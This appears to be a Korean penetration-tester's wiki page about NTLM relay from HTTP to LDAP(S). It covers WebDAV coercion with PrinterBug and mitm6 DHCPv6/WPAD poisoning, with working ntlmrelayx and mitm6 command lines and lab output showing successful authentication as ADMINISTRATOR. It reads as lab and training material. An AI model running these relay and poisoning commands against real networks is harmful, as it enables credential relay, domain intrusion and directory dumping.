# HTTP to LDAP - TODO

HTTP to LDAP(S) 는 LDAP Signing 설정에 있어서 좀 더 자유로운 편이기 때문에 자주 사용되는 릴레이 공격이다. HTTP 트래픽을 받아올 때는 MITM6를 통한 DHCPv6 포이즈닝 혹은 Webdav 서비스를 이용한 강제 인증 (Petitpotam, Print Spooler) 등을 이용한다.&#x20;

* HTTP -> LDAP: LDAP Signing Disabled/Enabled 공격가능.  Required 일 시 공격 불가능.&#x20;
* HTTP -> LDAPS: LDAP Signing Disabled/Enabled/Required 모두 공격 가능. EPA (Extended Protection for Authentication) 사용시 공격 불가능.

HTTP to LDAP(S) 에는 크게 두 가지 공격 방식이 있다.&#x20;

1. Webdav + 강제인증: 타겟 서버가 Webdav 서비스를 실행중일 때 강제 인증을 통해 Webdav 서비스로부터 인증 트래픽을 받아낸 뒤, 이를 릴레이한다.&#x20;
2. MITM6: 타겟 서버가 DHCPv6 에 취약하다면  ipv6 DNS 서버를 스푸핑 한 뒤, ipv6 관련된 트래픽을 공격자 서버로 보낸다. 그 뒤, 이 트래픽을 릴레이한다.&#x20;

\#1 번의 경우 도메인 유저 맥락이 필요하기 때문에 도메인 장악 보다는 Webdav 호스트의 LDAP 특성을 조작해 장악하는 방식으로, 횡적 이동에 자주 사용된다.&#x20;

\#2 번의 경우 아무런 유저 계정 정보없이 머신 계정 생성 및 LDAP 정보 덤프가 가능하기 때문에 도메인 진입에 자주 사용된다.&#x20;

### 1. Webdav 강제 인증&#x20;

```
# 1. Webdav 확인 
webclientservicescanner choi.local/low:'Password123!'@192.168.40.0/24

# 2. Webdav + Printerbug 강제 인증 
python3 printerbug.py choi.local/low:'Password123!'@192.168.40.151 kali@80/choiredteam 

# 3. ntlmrelayx
./ntlmrelayx.py -t ldaps://192.168.40.150 --no-da --no-acl -smb2support --no-dump

[*] HTTPD(80): Connection from 192.168.40.151 controlled, attacking target ldaps://192.168.40.150
[*] HTTPD(80): Authenticating against ldaps://192.168.40.150 as WKSTN01/ADMINISTRATOR SUCCEED
```



### 2. MITM6  &#x20;

```
# 1. MITM6 세팅 
python3 mitm6.py -d <도메인> --ignore-nofqdn

# 1-1. 특정 호스트만 화이트리스트 처리 후 mitm6 공격 
python3 mitm6.py -d <도메인> --ignore-nofqdn -hw <호스트 FQDN>
python3 mitm6.py -d choi.local --ignore-nofqdn -hw wkstn01.choi.local

# 2. ntlmrelayx 세팅 
python3 ntlmrelayx.py -t ldap://<ip> -wh <wpad-이름-아무거나> -6 --no-da --no-acl
python3 ntlmrelayx.py -t ldap://192.168.40.150 -wh choipad -6 --no-da --no-acl

# ntlmrelayx 공격 결과 
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Connection from ::ffff:192.168.40.151 controlled, attacking target ldap://192.168.40.150
[*] HTTPD(80): Authenticating against ldap://192.168.40.150 as CHOI/ADMINISTRATOR SUCCEED
[*] Domain info dumped into lootdir!

```

ntlmrelayx 의 기본적인 LDAP 공격은 도메인 어드민 유저를 생성한다거나 ACL 공격을 함부로 진행하는 등의 고객사 네트워크에 사용하기엔 좀 위험한 공격들이 있다. 따라서 `--no-da` 와 `--no-acl` 등의 플래그를 이용해서 기본 공격들을 진행하지 않는다.&#x20;

위 실습에서는 오로지 도메인 정보만 덤프하는 아주 기본적인 공격을 진행했다. 사실상 BloodHound 를 실행한 것과 같은 공격이다.&#x20;



### MISC&#x20;

* DHCPv6 포이즈닝 관련 테스트를 할때는 nic을 껐다 켰다 하는게 제일 빠른 것 같다.&#x20;
* wpad 관련된 공격에서는 컴퓨터를 재부팅하거나 재로그인 하는 것이 도움될 때가 있다.&#x20;

### 레퍼런스&#x20;

{% embed url="https://github.com/Hackndo/WebclientServiceScanner" %}

{% embed url="https://github.com/dirkjanm/krbrelayx" %}

{% embed url="https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/" %}
